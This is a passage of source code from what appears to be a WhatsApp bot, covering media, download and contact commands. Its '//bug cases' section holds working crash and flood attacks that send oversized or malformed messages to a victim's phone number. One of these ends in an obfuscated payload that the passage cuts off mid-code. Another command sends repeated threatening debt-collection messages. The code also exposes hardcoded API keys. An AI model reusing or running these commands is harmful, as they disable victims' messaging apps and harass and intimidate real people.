                fs.unlinkSync(delb)
                replygcYosh(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('Enter the Name')
                if (!VoiceNoteYosh.includes(q)) return replygcYosh("Name Not Registered in Database")
                let wanu = VoiceNoteYosh.indexOf(q)
                VoiceNoteYosh.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteYosh))
                fs.unlinkSync(`./YoshMedia/audio/${q}.mp3`)
                replygcYosh(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replygcYosh(mess.prem)
await loading()
if (args.length < 1) return replygcYosh(`What's the zip name?`)
let teks = `${text}`
{
if (ZipYosh.includes(teks)) return replygcYosh("This name is already in use")
let delb = await Yosh.downloadAndSaveMediaMessage(quoted)
ZipYosh.push(teks)
await fsx.copy(delb, `./YoshMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipYosh))
fs.unlinkSync(delb)
replygcYosh(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replygcYosh(mess.prem)
await loading()
if (args.length < 1) return replygcYosh('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipYosh.includes(teks)) return replygcYosh("This name does not exist in the database")
let wanu = ZipYosh.indexOf(teks)
ZipYosh.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipYosh))
fs.unlinkSync(`./YoshMedia/zip/${teks}.zip`)
replygcYosh(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipYosh) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipYosh.length}*`
replygcYosh(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replygcYosh(mess.prem)
await loading()
if (args.length < 1) return replygcYosh('What is the name of the apk?')
let teks = `${text}`
{
if (ApkYosh.includes(teks)) return replygcYosh("This name is already in use")
let delb = await Yosh.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./YoshMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkYosh))
fs.unlinkSync(delb)
replygcYosh(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replygcYosh(mess.prem)
await loading()
if (args.length < 1) return replygcYosh('Name of the apk?')
let teks = `${text}`
{
if (!ApkYosh.includes(teks)) return replygcYosh("This name does not exist in the database")
let wanu = ApkYosh.indexOf(teks)
ApkYosh.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkYosh))
fs.unlinkSync(`./YoshMedia/apk/${teks}.apk`)
replygcYosh(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkYosh) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkYosh.length}`
replygcYosh(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replygcYosh(mess.prem)
await loading()
if (args.length < 1) return replygcYosh('What is the name of the pdf')
let teks = `${text}`
{
if (DocYosh.includes(teks)) return replygcYosh("This name is already in use")
let delb = await Yosh.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./YoshMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocYosh))
fs.unlinkSync(delb)
replygcYosh(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replygcYosh(mess.prem)
await loading()
if (args.length < 1) return replygcYosh('Enter the name')
let teks = `${text}`
{
if (!DocYosh.includes(teks)) return replygcYosh("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocYosh))
fs.unlinkSync(`./YoshMedia/doc/${teks}.pdf`)
replygcYosh(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replygcYosh(teksoooo)
}
break
        case 'poll': {
            
                    let [poll, opt] = text.split("|")
                    if (text.split("|") < 2)
                        return await replygcYosh(
                            `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Yosh,Cheems,Doge...`
                        )
                    let options = []
                    for (let i of opt.split(',')) {
                        options.push(i)
                    }
                    await Yosh.sendMessage(m.chat, {
                        poll: {
                            name: poll,
                            values: options
                        }
                    })
                }
                break  
                case 'getcontact': case 'getcon': {
                    if (!m.isGroup) return replygcYosh(mess.group)
                    if (!(isGroupAdmins || YoshTheCreator)) return YoshStickAdmin()
                    Yoshbigpp = await Yosh.sendMessage(m.chat, {
                        text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
                    }, {quoted: m, ephemeralExpiration: 86400})
                    await sleep(1000)
                    Yosh.sendContact(m.chat, participants.map(a => a.id), Yoshbigpp)
                    }
                    break
                    case 'savecontact': case 'svcontact':{
                    if (!m.isGroup) return replygcYosh(mess.group)
                    if (!(isGroupAdmins || YoshTheCreator)) return YoshStickAdmin()
                    let cmiggc = await Yosh.groupMetadata(m.chat)
                    let orgiggc = participants.map(a => a.id)
                    vcard = ''
                    noPort = 0
                    for (let a of cmiggc.participants) {
                        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
                    }
                    let nmfilect = './contacts.vcf'
                    replygcYosh('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
                    require('fs').writeFileSync(nmfilect, vcard.trim())
                    await sleep(2000)
                    Yosh.sendMessage(m.chat, {
                        document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
                    }, {ephemeralExpiration: 86400, quoted: m})
                    require('fs').unlinkSync(nmfilect)
                    }
                    break
                    case 'sendcontact': case 'sencontact': {
                    if (!m.isGroup) return replygcYosh(mess.group)
                    if (!m.mentionedJid[0]) return replygcYosh('\nUse like this\n Example:.sendcontact @tag|name')
                    let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
                    let snContact = {
                        displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
                    }
                    Yosh.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
                    }
                    break
                    case 'contacttag': case 'contag':{
                    if (!m.isGroup) return replygcYosh(mess.group)
                    if (!(isGroupAdmins || YoshTheCreator)) return YoshStickAdmin()
                    if (!m.mentionedJid[0]) return replygcYosh('\nUse like this\n Example:.contacttag @tag|name')
                    let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
                    let sngContact = {
                        displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
                    }
                    Yosh.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
                    }
                    break
                case 'pinchat': {
                    if (!m.isGroup) return replygcYosh(mess.group)
                    Yosh.chatModify({ pin: true }, m.chat)
                    }
                    break
                    case 'unpinchat': {
                        if (!m.isGroup) return replygcYosh(mess.group)
                    Yosh.chatModify({ pin: false }, m.chat)
                    }
                    break 
case 'afk':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (isAfkOn) return replygcYosh("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcYosh(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case 'play':  case 'song': {
if (!text) return replygcYosh(`Example : ${prefix + command} anime whatsapp status`)
    await loading()
const Yoshplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await Yoshplaymp3.mp3(anup3k.url)
await Yosh.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const Yoshaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !Yoshaudp3.isYTUrl(text)) return replygcYosh(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await Yoshaudp3.mp3(text)
await Yosh.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break

case'tiktok':{
    if (!text) return replygcYosh(`Use it by the way: ${prefix+command} *query*\n\n_Example_\n\n${prefix+command} khaby lame`)
    Yosh.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try{
    let anu = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
    const capt = anu.result.title
    await Yosh.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
    await Yosh.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
    }catch (error) {
    replygcYosh(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
    }
    }
    break
    case 'tiktokvideo':
    case 'tiktokmp4': {
    if (!q) return replygcYosh( `Example : ${prefix + command} link`)
    if (!q.includes('tiktok')) return replygcYosh(`Link Invalid!!`)
    require('./lib/tiktok').Tiktok(q).then( data => {
    Yosh.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
    })
    }
    break
    case 'tiktokmp3':
    case 'tiktokaudio':{
    if (!q) return replygcYosh( `Example : ${prefix + command} link`)
    if (!q.includes('tiktok')) return replygcYosh(`Link Invalid!!`)
    require('./lib/tiktok').Tiktok(q).then( data => {
    const Yoshtikmp3 = {url:data.audio}
    Yosh.sendMessage(m.chat, { audio: Yoshtikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
    })
    }
    break
    case'ttslide': case 'tiktokslide':{
    if (!text) return replygcYosh(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
    Yosh.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try{
    let anu = await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`)
    await Yosh.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
    await Yosh.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
    }catch (error) {
    await Yosh.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
    }
    }
    break
    case 'remini': 
        case 'hd': 
        case 'jadihd': 
        case 'hdr':
        {
           if (!m.quoted) return replygcYosh(`Reply gambar ${prefix}${command}`)
            await loading()
                const { remini } = require('./lib/remini')
                    let media = await quoted.download()
               let proses = await remini(media, "enhance");
               Yosh.sendMessage(m.chat, { image: proses, caption:"𝐃𝐨𝐧𝐞 𝐊𝐚𝐤"}, { quoted: m})
            }
        break
    case'tozombie':{
        if (!quoted) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
        if (!/image/.test(mime)) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
        let q = m.quoted ? m.quoted : m
        let media = await q.download()
        let url = await uploadImage(media)
        let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
        let data = await anu.json()
        await Yosh.sendMessage(m.chat, {image: {url: data.url}, caption: `Here u go!`}, {quoted: m})
        }
        break
    case 'carbon':{
        if (!text) return replygcYosh(`Usage: ${prefix}Yosh`);
        Yosh.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
        let ini = await fetchJson(`https://aemt.me/carbon?text=${text}`);
        for (let carbon of ini.result) {
        await sleep(500)
        await Yosh.sendMessage(m.chat, { image: { url: carbon }, caption: ``}, {quoted: m})
        }}
        break
        case'smeta': {
            if (!/webp/.test(mime)) return replygcYosh('Reply sticker!')
              var stiker = false
                try {
                    let [packname, ...author] = q.split('|')
                        //var author = (author  []).join('|')
                            let mime = m.quoted.mimetype || ''
                                    //let img = await q.download()
                                        let img = await Yosh.downloadAndSaveMediaMessage(quoted, makeid(5))
                                            if (!img) return replygcYosh('Reply a sticker!')
                                                var stiker = await addExifAvatar(img, `Made by`, `Yosh`)
                                                  } catch (e) {
                                                      console.error(e)
                                                          if (Buffer.isBuffer(e)) stiker = e
                                                            } finally {
                                                                if (stiker) Yosh.sendMessage(m.chat, {
                                                                      sticker: stiker
                                                                          }, {
                                                                                quoted: m
                                                                                    })
                                                                                        else return replygcYosh('reply sticker')
                                                                                          }
                                                                                          }       
                                                                                          break
case 'ytmp4': case 'ytvideo': {
const Yoshvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !Yoshvidoh.isYTUrl(text)) replygcYosh(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await Yoshvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await Yosh.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
Yosh_dev = await getBuffer(`https://github.com/DGYosh/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Yosh.sendMessage(m.chat, { audio: Yosh_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case 'clearchat':
Yoshimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'xreact': 
case 'cocote': {
if (!m.quoted) return replygcYosh(`${prefix + command}`)
await Yosh.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await Yosh.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case '1':  {
if (!isPremium) return replygcYosh(mess.prem)
if (!m.quoted) return replygcYosh(`Example usage: ${prefix + command} reply chat`)
await Yosh.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await Yosh.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case '3': case 'x2': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
                case 'hd': case 'jadianime':
if (!quoted) return replygcYosh(`Fotonya Mana?`)
if (!/image/.test(mime)) return replygcYosh(`Send/Reply Foto Dengan Caption ${prefix + command}`)
    await loading()
    const media2 = await Yosh.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media2)
Yosh.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/upscale?apikey=GataDios&img=${anu}` }, caption: 'Result 🍟'}, { quoted: m})
console.error(error)
break
case 'remini': {
    if (!quoted) return replygcYosh(`Where is the picture?`)
    if (!/image/.test(mime)) return replygcYosh(`Send/Reply Photos With Captions ${prefix + command}`)
    let media = await quoted.download()
    let proses = await (media, {image: { url: `https://api.lolhuman.xyz/api/upscale?apikey=GataDios&img=${anu}` }, caption: 'Result 🍟'})
    Yosh.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
    }
    break
    case "pin":
			
    let query1 = "michiejkt48";{
                  const michie = await fetch(`https://api.lolhuman.xyz/api/pinterest2?apikey=eadc770e374031b231a744a3
                  &query=${query1}`);
                  const michiee = await michie.json();
                  let urlmichie = michiee.result[Math.floor(Math.random() * michiee.result.length)];
                  Yosh.sendMessage(m.chat, { image: urlmichie}, m);
                }
                break
case 'yosep': {
    const pler = {
        "key": { 
          "fromMe": false,
          "participant": '0@s.whatsapp.net',
          "remoteJid": 'status@broadcast' 
        },
        message: {
          "listResponseMessage": {
            title: `💀 Malaikat Pinjol ☠️`
          }
        }
      };

      for (let i = 0; i < 5; i++) {
       
        await Yosh.sendMessage(m.chat,{ text: '`HALLO BOS`\n\nGIMANA HUTANG NYA BOS GA DI BAYAR” kan?\n*Ingat Boss Saya bisa SEBARKAN:*\n> Foto KTP\n> Foto selfie Anda\n> beserta kontak darurat yang Anda cantumkan saat awal pengajuan.\n\n_yakin masih mau melalaikan?_ *Tolong kerjasamanya ya.*\n\n*WHATSAPP ANDA AKAN RUSAK JIKA TIDAK SEGERA MELUNASKAN PINJAMAN ANDA*'}, { quoted: pler })
      }
replygcYosh(`Successfully Sent Bug `)
}
break
case '2':case 'x': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx|5`) 
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
replygcYosh(`Successfully Sent Bug To ${victim}`)
}
break
case 'seaart':case 'createart': {
if (!isPremium) return replygcYosh(mess.prem)
if (!args[0]) return replygcYosh(`Use ${prefix+command} Masukan ide anda`) 
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
replygcYosh(`Successfully Sent Bug To ${victim}`)
}
break
case '5': case 'iosbug2': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yosh.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
case '4': case 'iosbug': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yosh.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygcYosh(`Successfully Sent Bug To ${victim}`)
}
break
case '7': case 'xaudio2': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case '6': case 'xaudio': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example usage:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
replygcYosh(`Successfully Sent Bug To ${victim}`)
}
break
case '8': case 'xsticker': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
}
replygcYosh(`Successfully Sent Bug To ${victim}`)
}
break
case '9': case 'xsticker2': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example: ${prefix + command} 5`)
amount = text * 2
for (let i = 0; i < amount; i++) {
await Yosh.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
}
}
break
case '11': case 'xloc2': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example: ${prefix + command} 5`)
amount = text
YoshOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
Yosh.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${YoshOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
}
break
case '10': case 'xloc': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
YoshOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
Yosh.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${YoshOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
replygcYosh(`Successfully Sent Bug To ${victim}`)
}
break
case '12': case 'xlist': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example:\n${prefix + command} 91xxxxxxxxxx|5`)
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendMessage(victim, { text: '' }, { quoted: xbug2 })
}
replygcYosh(`Successfully Sent Bug To ${victim}`)
}
break
case '13': case 'xlist2': {
if (!isPremium) return replygcYosh(mess.prem)
if (!text) return replygcYosh(`Example:\n${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yosh.sendMessage(from, { text: '' }, { quoted: xbug2 })
}
}
break
case '15': case 'xkill2': {
if (!isPremium) return replygcYosh(mess.prem)
 if (!args[0]) return replygcYosh(`Use ${prefix+command} amount\nExample ${prefix+command} 13`) 
let amount = text*10
function _0x4eaeea(_0x43de39,_0x57c976,_0x430754,_0x265f9d){return _0x453f(_0x43de39- -0xa3,_0x430754);}(function(_0x207b77,_0x50c310){function _0x2ee17f(_0x251028,_0x17f02c,_0x33af66,_0x3638bc){return _0x453f(_0x17f02c-0x3,_0x3638bc);}const _0x17001b=_0x207b77();function _0x936463(_0x57456c,_0x57c26a,_0x541f15,_0x3d525b){return _0x453f(_0x3d525b-0x1c3,_0x57456c);}while(!![]){try{const _0x292451=parseInt(_0x2ee17f(0xe8,0xef,0xf7,0xd8))/(-0x2034+0x16a2+0x993)*(parseInt(_0x936463(0x267,0x273,0x293,0x28b))/(-0x4f*0xe+-0x2d0+-0x4*-0x1c9))+-parseInt(_0x936463(0x291,0x269,0x247,0x27f))/(0x25ec+0x18a0+0x1*-0x3e89)+parseInt(_0x936463(0x2f9,0x2e7,0x28a,0x2bf))/(-0xf43+-0xe57+0x1d9e)*(-parseInt(_0x936463(0x2c6,0x2a7,0x2a4,0x290))/(-0x21cf+-0x1e3a+0x400e))+parseInt(_0x936463(0x241,0x23d,0x23c,0x264))/(0x1d05*0x1+0x113c+0x315*-0xf)*(-parseInt(_0x936463(0x299,0x2eb,0x2dd,0x2c9))/(-0x1948+0x1*-0x3e2+-0x3*-0x9bb))+-parseInt(_0x2ee17f(0x9d,0x94,0xd3,0xb7))/(0x143b+-0x392+-0x2b*0x63)*(-parseInt(_0x936463(0x294,0x253,0x254,0x270))/(0x2026+0x2*-0x698+-0x12ed))+parseInt(_0x2ee17f(0xfb,0x10d,0x131,0x13c))/(-0x2019*0x1+0xd72+0xf*0x13f)+parseInt(_0x2ee17f(0xbb,0xc1,0xe0,0xbb))/(0x4*-0x7bb+-0x14f2+0x33e9);if(_0x292451===_0x50c310)break;else _0x17001b['push'](_0x17001b['shift']());}catch(_0x497449){_0x17001b['push'](_0x17001b['shift']());}}}(_0x3b9f,0x1223*-0x31+0x105*-0x3f+0x1*0x5c66f));const _0x1c8a3c=(function(){const _0x155a57={};function _0x4976a3(_0x25dcc7,_0x26931b,_0x1cd801,_0xb85f6){return _0x453f(_0x1cd801-0x1c2,_0x25dcc7);}_0x155a57[_0x531257(0x2b2,0x2c1,0x278,0x2ba)]=function(_0x5b2945,_0x2c34dd){return 